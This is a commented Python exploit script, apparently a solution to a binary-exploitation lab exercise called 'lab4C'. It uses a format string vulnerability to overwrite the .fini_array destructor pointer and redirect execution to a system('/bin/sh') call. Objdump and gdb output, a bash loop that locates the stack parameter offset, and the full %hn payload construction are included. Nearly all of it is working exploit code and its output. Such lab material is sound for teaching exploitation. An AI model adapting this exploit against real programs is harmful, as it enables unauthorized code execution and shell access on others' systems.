# Overwrite .fini_array - RELRO fully disabled. (.dtors)
# 
# .fini_array - is an array of pointers to destructors, being called before / after main().
'''
$objdump -s -j .fini_array lab4C

lab4C:     file format elf32-i386

Contents of section .fini_array:
 804b2a0 a0920408                             ....

gdb-peda$ find .fini_array
Searching for '.fini_array' in: None ranges
Found 2 results, display max 2 items:
lab4C : 0x804a943 ("_fini_array_entry")
lab4C : 0x804ac9a (".fini_array")

'''

# Jump to 0x080495a2 for system("/bin/sh"), just after the jne => which jumps to "wrong password" 

'''
   0x080495a0 <+714>:   jne    0x80495cb <main+757>
=> 0x080495a2 <+716>:   lea    eax,[esp+0x94]
   0x080495a9 <+723>:   mov    DWORD PTR [esp+0x4],eax
   0x080495ad <+727>:   lea    eax,[ebx-0x1298]
   0x080495b3 <+733>:   mov    DWORD PTR [esp],eax
   0x080495b6 <+736>:   call   0x8049100 <printf@plt>
   0x080495bb <+741>:   lea    eax,[ebx-0x1288]
   0x080495c1 <+747>:   mov    DWORD PTR [esp],eax
   0x080495c4 <+750>:   call   0x8049170 <system@plt>
'''

# To summarize:
#   1) Use the format string vulnerability to overwrite the .fini_array entry 
#   2) Direct execution to the 0x080495a2
#   3) Get a shell by 0x080495c4  call system("/bin/sh").


#  Check the vulnerable parameter number :
# => $for i in {1..100}; do echo "AAAA $i--%$i\$x" | ./lab4C  | grep 41414141 ;done
# Change value_2/1 and target_addr to point what-where write 
import struct  
 
target_addr = 0x804b2a0 # Pointer to accessible memory => .fini_array
h_target_addr = target_addr + 2 # Next 2 bytes written to 0x804b2a0
 
# Value to write in memory by %n => 0x080495a2
value_2= 0x0804
value_1= 0x95a2
 
buf = "" 
buf += struct.pack("<I",target_addr) 
buf += struct.pack("<I",h_target_addr) 

# Count length of character width 
count = value_1 - len(buf) 
buf += "%" + str(count) + "p"  # character width ( how many bytes to write )
buf += "%37$hn" # Direct parameter access, write the value of 2 bytes to location pointed  by 37th parameter on stack 
 
# Decrase the number of bytes to write by the number of bytes already written 
#count = int("0x1" + hex(value_2).strip("0x"),16) - value_1
count = 0x10804 - value_1
buf += "%" + str(count) + "p" 
buf += "%38$hn" # as above, but 38th parameter 
print buf
